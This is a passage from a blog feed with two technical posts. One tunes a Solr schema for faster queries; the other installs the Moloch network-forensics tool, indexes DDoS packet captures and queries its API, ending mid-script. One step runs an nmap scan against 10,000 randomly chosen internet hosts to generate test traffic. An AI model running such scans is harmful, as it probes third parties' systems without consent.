<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="nt">&lt;fieldType</span> <span class="na">name=</span><span class="s">&quot;text_UAX29&quot;</span> <span class="na">class=</span><span class="s">&quot;solr.TextField&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>  <span class="nt">&lt;analyzer&gt;</span>
</span><span class='line'>    [...]
</span><span class='line'>    <span class="nt">&lt;filter</span> <span class="na">class=</span><span class="s">&quot;solr.TypeTokenFilterFactory&quot;</span> <span class="na">types=</span><span class="s">&quot;allowedtypes.txt&quot;</span> <span class="na">enablePositionIncrements=</span><span class="s">&quot;true&quot;</span> <span class="na">useWhitelist=</span><span class="s">&quot;true&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'>  <span class="nt">&lt;/analyzer&gt;</span>
</span><span class='line'><span class="nt">&lt;/fieldType&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>
In &#8220;allowedtypes.txt&#8221; file we need to put &lt;EMAIL> and &lt;URL> (one per line) as allowed token type and we should change IP addresses tokenizer to make a small hack and return only IP addresses or extending <a href="http://lucene.apache.org/core/4_0_0/analyzers-common/org/apache/lucene/analysis/util/TokenFilterFactory.html">TokenFilterFactory</a> for filtering after tokenizing process.</p>

<p>Really sorry and apologies for any inconveniences.</p>

<h2>Second improvement: Don&#8217;t waste resources in features not being used</h2>

<p>Solr is a really powerful full-text search engine and, as such, it is able to perform several kind of analysis for indexed data in an automated way. Obviously those analysis need resources to be made so we are wasting CPU cycles and RAM if we are not going to use them.</p>

<p>One of these features is related to solr capability for boosting some query results over others and is based on certain &#8220;weight&#8221;. For example, two documents mentioning &#8220;solr&#8221; keyword just one time - one with a length of just few words and the other having several thousands - will have different relevances for solr engine, being more important the smallest one. This is because of term frequency-inverse document frequeny (usually refered as <a href="http://en.wikipedia.org/wiki/Tf%E2%80%93idf">tf-idf</a>) statistic approach, if same keyword appear same number of time it represents a bigger percentage of the entire document in the smallest one.</p>

<p>Because we are not going to use this feature we can disable it and save some resources modifying schema.xml file:</p>

<figure class='code'><figcaption><span>Avoiding some statistical analysis</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'>  <span class="nt">&lt;fields&gt;</span>
</span><span class='line'>    [...]
</span><span class='line'>    <span class="nt">&lt;field</span> <span class="na">name=</span><span class="s">&quot;text&quot;</span> <span class="na">type=</span><span class="s">&quot;text_general&quot;</span> <span class="na">indexed=</span><span class="s">&quot;true&quot;</span> <span class="na">stored=</span><span class="s">&quot;true&quot;</span> <span class="na">multiValued=</span><span class="s">&quot;false&quot;</span> <span class="na">omitNorms=</span><span class="s">&quot;true&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'>    <span class="nt">&lt;field</span> <span class="na">name=</span><span class="s">&quot;url&quot;</span> <span class="na">type=</span><span class="s">&quot;string&quot;</span> <span class="na">indexed=</span><span class="s">&quot;true&quot;</span> <span class="na">stored=</span><span class="s">&quot;true&quot;</span> <span class="na">multiValued=</span><span class="s">&quot;false&quot;</span> <span class="na">required=</span><span class="s">&quot;true&quot;</span> <span class="na">omitNorms=</span><span class="s">&quot;true&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'>    [...]
</span><span class='line'>    <span class="nt">&lt;field</span> <span class="na">name=</span><span class="s">&quot;ip_addresses&quot;</span> <span class="na">type=</span><span class="s">&quot;ip_addresses&quot;</span> <span class="na">indexed=</span><span class="s">&quot;true&quot;</span> <span class="na">stored=</span><span class="s">&quot;false&quot;</span> <span class="na">multiValued=</span><span class="s">&quot;false&quot;</span> <span class="na">omitNorms=</span><span class="s">&quot;true&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'>    <span class="nt">&lt;field</span> <span class="na">name=</span><span class="s">&quot;text_UAX29&quot;</span> <span class="na">type=</span><span class="s">&quot;text_UAX29&quot;</span> <span class="na">indexed=</span><span class="s">&quot;true&quot;</span> <span class="na">stored=</span><span class="s">&quot;false&quot;</span> <span class="na">multiValued=</span><span class="s">&quot;false&quot;</span> <span class="na">omitNorms=</span><span class="s">&quot;true&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'>    [...]
</span><span class='line'>  <span class="nt">&lt;/fields&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>
By setting &#8220;omitNorms&#8221; to &#8220;true&#8221; we specify solr to not don&#8217;t care about length normalization or index-time boosting, you can check the <a href="http://wiki.apache.org/solr/SchemaXml">wiki</a> for more information.</p>

<p>Another feature we don&#8217;t need now is the solr ability to find similar documents to given one (feature called <a href="http://wiki.apache.org/solr/MoreLikeThis">MoreLikeThis</a>). To do this we can take several approaches as compare tf-idf values or, more accurate way, represent each document as a vector (<a href="http://en.wikipedia.org/wiki/Vector_space_model">vector space model</a>) and find near ones (solr mix both).</p>

<p>Because we are not going to use this feature we can set it off by specifying following field options:</p>

<figure class='code'><figcaption><span>Disabling vector space model at schema.xml</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'>  <span class="nt">&lt;fields&gt;</span>
</span><span class='line'>    [...]
</span><span class='line'>    <span class="nt">&lt;field</span> <span class="na">name=</span><span class="s">&quot;text&quot;</span> <span class="na">type=</span><span class="s">&quot;text_general&quot;</span> <span class="na">indexed=</span><span class="s">&quot;true&quot;</span> <span class="na">stored=</span><span class="s">&quot;true&quot;</span> <span class="na">multiValued=</span><span class="s">&quot;false&quot;</span> <span class="na">omitNorms=</span><span class="s">&quot;true&quot;</span> <span class="na">termVectors=</span><span class="s">&quot;false&quot;</span> <span class="na">termPositions=</span><span class="s">&quot;false&quot;</span> <span class="na">termOffsets=</span><span class="s">&quot;false&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'>    <span class="nt">&lt;field</span> <span class="na">name=</span><span class="s">&quot;url&quot;</span> <span class="na">type=</span><span class="s">&quot;string&quot;</span> <span class="na">indexed=</span><span class="s">&quot;true&quot;</span> <span class="na">stored=</span><span class="s">&quot;true&quot;</span> <span class="na">multiValued=</span><span class="s">&quot;false&quot;</span> <span class="na">required=</span><span class="s">&quot;true&quot;</span> <span class="na">omitNorms=</span><span class="s">&quot;true&quot;</span> <span class="na">termVectors=</span><span class="s">&quot;false&quot;</span> <span class="na">termPositions=</span><span class="s">&quot;false&quot;</span> <span class="na">termOffsets=</span><span class="s">&quot;false&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'>    [...]
</span><span class='line'>    <span class="nt">&lt;field</span> <span class="na">name=</span><span class="s">&quot;ip_addresses&quot;</span> <span class="na">type=</span><span class="s">&quot;ip_addresses&quot;</span> <span class="na">indexed=</span><span class="s">&quot;true&quot;</span> <span class="na">stored=</span><span class="s">&quot;false&quot;</span> <span class="na">multiValued=</span><span class="s">&quot;false&quot;</span> <span class="na">omitNorms=</span><span class="s">&quot;true&quot;</span> <span class="na">termVectors=</span><span class="s">&quot;false&quot;</span> <span class="na">termPositions=</span><span class="s">&quot;false&quot;</span> <span class="na">termOffsets=</span><span class="s">&quot;false&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'>    <span class="nt">&lt;field</span> <span class="na">name=</span><span class="s">&quot;text_UAX29&quot;</span> <span class="na">type=</span><span class="s">&quot;text_UAX29&quot;</span> <span class="na">indexed=</span><span class="s">&quot;true&quot;</span> <span class="na">stored=</span><span class="s">&quot;false&quot;</span> <span class="na">multiValued=</span><span class="s">&quot;false&quot;</span> <span class="na">omitNorms=</span><span class="s">&quot;true&quot;</span> <span class="na">termVectors=</span><span class="s">&quot;false&quot;</span> <span class="na">termPositions=</span><span class="s">&quot;false&quot;</span> <span class="na">termOffsets=</span><span class="s">&quot;false&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'>    [...]
</span><span class='line'>  <span class="nt">&lt;/fields&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>
I have disabled them with these options &#8221;<em>termVectors=&#8221;false&#8221; termPositions=&#8221;false&#8221; termOffsets=&#8221;false&#8221;</em>&#8221; and gain some performance boost.</p>

<p>If you want to know which field options to use based on your application aim take a look to official <a href="http://wiki.apache.org/solr/FieldOptionsByUseCase">wiki</a>:<br/>
<img src="http://blog.alejandronolla.com/images/upload/2013/04/fieldoptionsbyusecase.png"></p>

<h2>Third improvement: Avoid indexing stopwords</h2>

<p>When doing natural lenguage processing the term &#8220;stopwords&#8221; is used to refer those words that should be removed before processing text because of their uselessness. For example, when indexing a document with content like &#8220;Visit me at blog.alejandronolla.com&#8221; we don&#8217;t care about personal pronoun &#8220;me&#8221; and preposition &#8220;at&#8221; (<a href="http://en.wikipedia.org/wiki/Part-of-speech_tagging">take a look to part-of-speech tagging</a>) so less indexed words, less used resources.</p>

<p>To avoid processing those words we need to specify solr where stopwords are located:</p>

<figure class='code'><figcaption><span>Avoiding stopwords being processed</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'>  <span class="nt">&lt;fields&gt;</span>
</span><span class='line'>    [...]
</span><span class='line'>    <span class="nt">&lt;fieldType</span> <span class="na">name=</span><span class="s">&quot;text_general&quot;</span> <span class="na">class=</span><span class="s">&quot;solr.TextField&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>      <span class="nt">&lt;analyzer</span> <span class="na">type=</span><span class="s">&quot;index&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>        <span class="nt">&lt;tokenizer</span> <span class="na">class=</span><span class="s">&quot;solr.WhitespaceTokenizerFactory&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'>        <span class="nt">&lt;filter</span> <span class="na">class=</span><span class="s">&quot;solr.StopFilterFactory&quot;</span> <span class="na">ignoreCase=</span><span class="s">&quot;true&quot;</span> <span class="na">words=</span><span class="s">&quot;stopwords.txt&quot;</span> <span class="na">enablePositionIncrements=</span><span class="s">&quot;true&quot;</span> <span class="nt">/&gt;</span>
</span><span class='line'>        <span class="nt">&lt;filter</span> <span class="na">class=</span><span class="s">&quot;solr.LowerCaseFilterFactory&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'>      <span class="nt">&lt;/analyzer&gt;</span>
</span><span class='line'>      <span class="nt">&lt;analyzer</span> <span class="na">type=</span><span class="s">&quot;query&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>        <span class="nt">&lt;tokenizer</span> <span class="na">class=</span><span class="s">&quot;solr.WhitespaceTokenizerFactory&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'>        <span class="nt">&lt;filter</span> <span class="na">class=</span><span class="s">&quot;solr.StopFilterFactory&quot;</span> <span class="na">ignoreCase=</span><span class="s">&quot;true&quot;</span> <span class="na">words=</span><span class="s">&quot;stopwords.txt&quot;</span> <span class="na">enablePositionIncrements=</span><span class="s">&quot;true&quot;</span> <span class="nt">/&gt;</span>
</span><span class='line'>        <span class="nt">&lt;filter</span> <span class="na">class=</span><span class="s">&quot;solr.LowerCaseFilterFactory&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'>      <span class="nt">&lt;/analyzer&gt;</span>
</span><span class='line'>    <span class="nt">&lt;/fieldType&gt;</span>
</span><span class='line'>    [...]
</span><span class='line'>  <span class="nt">&lt;/fields&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>
We need to have a file called <em>&#8220;stopwords.txt&#8221;</em> at our <em>&#8220;conf&#8221;</em> directory for specified core containing these words and we can find some stopwords for several languages in the example configuration provided with solr package at <em>&#8220;/PATH/TO/SOLR/CORE/conf/lang&#8221;</em>:</p>

<figure class='code'><figcaption><span>Some English stopwords</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@ph0b0s:/opt/solr/solr/conf/lang# tail stopwords_en.txt
</span><span class='line'>their
</span><span class='line'><span class="k">then</span>
</span><span class='line'>there
</span><span class='line'>these
</span><span class='line'>they
</span><span class='line'>this
</span><span class='line'>to
</span><span class='line'>was
</span><span class='line'>will
</span><span class='line'>with
</span></code></pre></td></tr></table></div></figure>


<p>
Of course, we can also include as stop words common words that don&#8217;t give us any useful information like dog, bread, ROI, APT and so on&#8230;</p>

<h2>Fourth impromevent: Word stemming</h2>

<p>Despite of haven&#8217;t used stemming yet in solr environments it&#8217;s possible to convert a given word to his morphological root through an <a href="http://wiki.apache.org/solr/AnalyzersTokenizersTokenFilters#Stemming">stemming</a> process:</p>

<figure class='code'><figcaption><span>Stemming word with python example</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="nn">nltk.stemmer.porter</span> <span class="kn">import</span> <span class="n">PorterStemmer</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">PorterStemmer</span><span class="p">()</span><span class="o">.</span><span class="n">stem_word</span><span class="p">(</span><span class="s">&#39;documents&#39;</span><span class="p">)</span>
</span><span class='line'><span class="s">&#39;document&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>
Because we &#8220;reduce&#8221; words to his root probably few of them, per document, will share stem and this will result in a smaller index and more performance booster.</p>

<h2>Fifth improvement: Don&#8217;t ask the same two times</h2>

<p>Depending on application data and workflow it could be really useful to cache &#8220;n&#8221; most common queries/filters/documents and avoid doing over and over the same query in a few minutes apart, i&#8217;m sorry but haven&#8217;t played around too much with it, so to read more about this go to the <a href="http://wiki.apache.org/solr/SolrCaching">wiki</a>.</p>

<h2>Results</h2>

<p>After taking first two improvements actions did some performance test and comparisons, so here are some info for a &#8220;small&#8221; subset of about 300k documents:</p>

<table border="1">
    <tr>
        <td></td>
        <td align="right">Original schema</td>
        <td align="right">Modified schema</td>
    </tr>
    <tr>
        <td align="left">Indexing time: </td>
        <td align="right">95 minutes</td>
        <td align="right">101 minutes</td>
    </tr>
    <tr>
        <td align="left">Index size: </td>
        <td align="right">555.12 MB</td>
        <td align="right">789.8 MB</td>
    </tr>
    <tr>
        <td align="left">Field being queried: </td>
        <td align="right">text</td>
        <td align="right">text_UAX29</td>
    </tr>
    <tr>
        <td align="left">Worst query scenario: </td>
        <td align="right">84766 milliseconds</td>
        <td align="right">52417 milliseconds</td>
    </tr>
    <tr>
        <td align="left">Worst query improvement: </td>
        <td align="center">&#8211;</td>
        <td align="right">38,2% faster</td>
    </tr>
</table>


<p></p>

<p>As shown in the above table, the &#8220;worst&#8221; query i&#8217;m now performing (dozens of logical operators and wildcards) will take about 38% time less per query hit and, in an application which performs hundreds of query per hour, it&#8217;s a great improvement without disrupting normal functioning (looking for domains and IP addresses) and, in the other hand, it will take almost no more time to index and more than reasonable index size increment that worth it.</p>

<p>Hope you liked it and can apply someway to your needs, see you soon!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Moloch: Capturing and indexing network traffic in realtime]]></title>
    <link href="http://blog.alejandronolla.com/2013/04/06/moloch-capturing-and-indexing-network-traffic-in-realtime/"/>
    <updated>2013-04-06T00:40:00+02:00</updated>
    <id>http://blog.alejandronolla.com/2013/04/06/moloch-capturing-and-indexing-network-traffic-in-realtime</id>
    <content type="html"><![CDATA[<h2>What is moloch?</h2>

<p>As his own <a href="https://github.com/aol/moloch">website</a> says: <strong><em>&#8220;Moloch is an open source, large scale IPv4 packet capturing (PCAP), indexing and database system. A simple web interface is provided for PCAP browsing, searching, and exporting. APIs are exposed that allow PCAP data and JSON-formatted session data to be downloaded directly.&#8221;</em></strong> it will be very useful as a network forensic tool to analyze captured traffic (moloch can also index previously captured pcap files as we will see) in case of a security incident or detecting some suspicious behaviour like, for example, some kind of alert in our IDS.</p>

<p>Thanks of indexing pcaps with <a href="http://www.elasticsearch.org/">elasticsearch</a>, moloch provide us with the ability to perform almost real-time searches among dozens or hundreds of captured GB network traffic being able to apply several filtering options on the way. It isn&#8217;t as complete as Wireshark filtering system for example but will save us tons of work when dealing with some filtering and visualization as well as Moloch will provide us with some features Wireshark lacks, like filtering by country or AS.</p>

<p>I&#8217;m sure to not be the only who would have loved to rely on moloch when analyzing dozens of GB with tshark and wireshark, particularly each time you apply a filter to show some kind of data&#8230;<!-- more --></p>

<h2>Installing moloch</h2>

<p>For deploying a moloch machine in a &#8220;all-in-one&#8221; setup i created a virtual machine with Ubuntu server 12.10 64bits and assigned about 100GB of HDD, 16GB of RAM and 4 CPU cores, moloch is a highly consuming platform, to have a more detailed info about this go to <a href="https://github.com/aol/moloch#id23">hardware requirements</a>.</p>

<p>First step will be updating the box, installing java and cloning github repository:</p>

<figure class='code'><figcaption><span>Updating system and cloning repo</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get install git openjdk-7-jdk openjdk-7-jre -y</span>
</span><span class='line'>
</span><span class='line'><span class="c"># git clone https://github.com/aol/moloch.git</span>
</span></code></pre></td></tr></table></div></figure>


<p>Once cloned the repo we must install, at least, one of his components: capture, viewer or elasticsearch. Because we are going to mess up a bit with moloch to get an overview of functionalities and capabilities we will take the shortest path, installing moloch through provided bash script to setup everything in the same machine; if you prefer to install it manually or are going to build a distributed cluster check &#8221;<a href="https://github.com/aol/moloch#id15">Building and Installing</a>&#8221;:</p>

<figure class='code'><figcaption><span>Installing moloch automatically</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>~/moloch# ./easybutton-singlehost.sh
</span></code></pre></td></tr></table></div></figure>


<p>Now the wizard will make us a few questions to configure moloch (capturer, viewer and elasticsearch instance) for us and everything will be running in a few moments (moloch will be installed by default at <em>&#8220;/data/moloch/&#8221;</em>) and we can access to web interface at <em>&#8220;https://MOLOCH_IP_ADDRESS:8005&#8221;</em>:<br/>
<img src="http://blog.alejandronolla.com/images/upload/2013/04/moloch_fresh_install.png"></p>

<p>As can be seen, moloch have already started to index all traffic seen on eth0, included every request to moloch web interface. If we don&#8217;t want this then we have to specify a capture filtering in <em><a href="http://en.wikipedia.org/wiki/Berkeley_Packet_Filter">Berkeley Packet Filter (bpf)</a></em> format at <em>&#8220;/data/moloch/etc/config.ini&#8221;</em>:</p>

<figure class='code'><figcaption><span>Don&#8217;t index ANY traffic related with moloch box</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">bpf</span><span class="o">=</span>not host 192.168.1.39
</span></code></pre></td></tr></table></div></figure>


<p>To change elasticsearch configuration and allow access from other IP address than moloch host itself (it could pose a security risk, using SSH tunneling would be a better aproach) go to <em>&#8220;/data/moloch/etc/elasticsearch.yml&#8221;</em> and edit network parameters (<em>network.host</em>), to view/change moloch configuration take a look to <em>&#8220;/data/moloch/etc/config.ini&#8221;</em>:</p>

<figure class='code'><figcaption><span>Changing binded IP address</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># Set the bind address specifically (IPv4 or IPv6):</span>
</span><span class='line'><span class="c">#</span>
</span><span class='line'>network.bind_host: 0.0.0.0
</span><span class='line'>
</span><span class='line'><span class="c"># Set the address other nodes will use to communicate with this node. If not</span>
</span><span class='line'><span class="c"># set, it is automatically derived. It must point to an actual IP address.</span>
</span><span class='line'><span class="c">#</span>
</span><span class='line'>network.publish_host: 0.0.0.0
</span><span class='line'>
</span><span class='line'><span class="c"># Set both &#39;bind_host&#39; and &#39;publish_host&#39;:</span>
</span><span class='line'><span class="c">#</span>
</span><span class='line'>network.host: 0.0.0.0
</span></code></pre></td></tr></table></div></figure>


<p>
We need to shutdown elasticsearch node and start it again, so here we go:</p>

<figure class='code'><figcaption><span>Restarting elasticsearch</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># curl -XPOST &#39;http://localhost:9200/_shutdown&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># nohup /data/moloch/bin/run_es.sh &amp;</span>
</span></code></pre></td></tr></table></div></figure>


<p>
We can also start viewer and capturer from same dir <em>&#8220;/data/moloch/bin/run_viewer.sh&#8221;</em> and <em>&#8220;/data/moloch/bin/run_capture.sh&#8221;</em> respectively.<br/>
Now we have access to <a href="http://mobz.github.com/elasticsearch-head/">elasticsearch-head</a> plugin to see elasticsearch cluster health and manage it at <em>&#8220;https://MOLOCH_IP_ADDRESS:9200/_plugin/head/&#8221;</em>:<br/>
<img src="http://blog.alejandronolla.com/images/upload/2013/04/elasticsearch_head.png"></p>

<h2>Moloch overview</h2>

<p>To have some info indexed by moloch in a few minutes we are going to make some light random nmap scans, having in mind the interface assigned to virtual machine. If you want to use virtual interface and launch nmap scan from moloch box then you could need to change bpf filter to <em>&#8220;bpf=not port (9200 or 8005)&#8221;</em> (this isn&#8217;t, by far, the correct way, but will be enough for a quick test).</p>

<figure class='code'><figcaption><span>Quick nmap scan to index some HTTP headers</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># ./nmap -sS -Pn -n -v -p80 -iR 10000 --script=http-headers</span>
</span></code></pre></td></tr></table></div></figure>


<p>
If we take a look again to moloch web interface now we will see some pretty info:<br/>
<img src="http://blog.alejandronolla.com/images/upload/2013/04/moloch_scan01.png"></p>

<p>We can see more info about any session clicking on &#8220;green plus&#8221; icon:<br/>
<img src="http://blog.alejandronolla.com/images/upload/2013/04/moloch_scan02.png"></p>

<p>A new dropdown will appear and will give us some interesting options like downloading pcap (for example, to make a deeper manual analysis with wireshark), downloading data in RAW format, and showing use a set of links to make some filtering.</p>

<p>Let&#8217;s click on &#8220;User-Agent link&#8221; and then make a search to show only those indexed packets using the NSE user-agent, now you know who have scanned your network with nmap&#8217;s HTTP plugins in just a second ;).<br/>
<img src="http://blog.alejandronolla.com/images/upload/2013/04/moloch_scan03.png"></p>

<p>Moloch also have a useful &#8220;stats&#8221; menu to have realtime statistics about traffic being captured and indexed:<br/>
<img src="http://blog.alejandronolla.com/images/upload/2013/04/moloch_stats.png"></p>

<h2>Indexing previously captured traffic</h2>

<p>To index traffic captured in pcap format we have to use &#8220;moloch-capture&#8221; stored in <em>&#8220;/data/moloch/bin/moloch-capture&#8221;</em>:</p>

<figure class='code'><figcaption><span>moloch-capture options</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># ./moloch-capture -h</span>
</span><span class='line'>Usage:
</span><span class='line'>  moloch-capture <span class="o">[</span>OPTION...<span class="o">]</span> - capture
</span><span class='line'>
</span><span class='line'>Help Options:
</span><span class='line'>  -h, --help         Show <span class="nb">help </span>options
</span><span class='line'>
</span><span class='line'>Application Options:
</span><span class='line'>  -c, --config       Config file name, default <span class="s1">&#39;/data/moloch/etc/config.ini&#39;</span>
</span><span class='line'>  -r, --pcapfile     Offline pcap file
</span><span class='line'>  -R, --pcapdir      Offline pcap directory, all *.pcap files will be processed
</span><span class='line'>  --recursive        When in offline pcap directory mode, recurse sub directories
</span><span class='line'>  -n, --node         Our node name, defaults to hostname.  Multiple nodes can run on same host.
</span><span class='line'>  -t, --tag          Extra tag to add to all packets, can be used multiple <span class="nb">times</span>
</span><span class='line'>  -v, --version      Show version number
</span><span class='line'>  -d, --debug        Turn on all debugging
</span><span class='line'>  --copy             When in offline mode copy the pcap files into the pcapDir from the config file
</span><span class='line'>  --dryrun           dry run, noting written to database
</span></code></pre></td></tr></table></div></figure>


<p>
I&#8217;m going to index a sample of about 7,5GB from a DNS amplification DDoS attack i had to analyze and help to mitigate some months ago, but to quickly download some pcaps to play around NetreseC have a published a good <a href="http://www.netresec.com/?page=PcapFiles">list</a>:</p>

<figure class='code'><figcaption><span>Indexing pcaps from a dir</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># ./moloch-capture -R /tmp/ddos_pcaps/ --tag ddos --copy</span>
</span></code></pre></td></tr></table></div></figure>


<p>
After some minutes i already had indexed some millions of packets and can view them just searching for tag ddos (i have stripped out map and some info to don&#8217;t disclose anything about customer / attack):<br/>
<img src="http://blog.alejandronolla.com/images/upload/2013/04/ddos_tags.png"></p>

<p>Let&#8217;s say we want to show every DNS datagram originating from port 53 by servers geolocated at Russia:<br/>
<img src="http://blog.alejandronolla.com/images/upload/2013/04/ddos_filtered.png"></p>

<p>As can be seen, there were peaks of almost 60.000 packets per second (DNS answers) with an average of approximately 20.000 at regular intervals in this six minutes slot.</p>

<p>Moloch give us the chance to visualize indexed traffic from a graph&#8217;s theory point of view (&#8220;Connections&#8221; tab), using hosts as nodes and connections (with or without port) as edges:<br/>
<img src="http://blog.alejandronolla.com/images/upload/2013/04/ddos_connections.png"></p>

<p>This is really useful to get an idea at a glance of what event is being analyzed, in this case we can easily spot few targets and thousands of hosts targeting them.</p>

<h2>Moloch API</h2>

<p>At the beginning of this post i said that Moloch have an API to query and get some info about indexed pcaps and so on in JSON format. At this moment probably the best way to see which calls exists is directly reading the viewer <a href="https://github.com/aol/moloch/blob/master/viewer/viewer.js">code</a>.</p>

<p>There is an example of python code to query moloch API and show some statistics:</p>

<figure class='code'><figcaption><span>Using moloch API to show some statistics</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">json</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">urllib2</span>
</span><span class='line'>
</span><span class='line'>
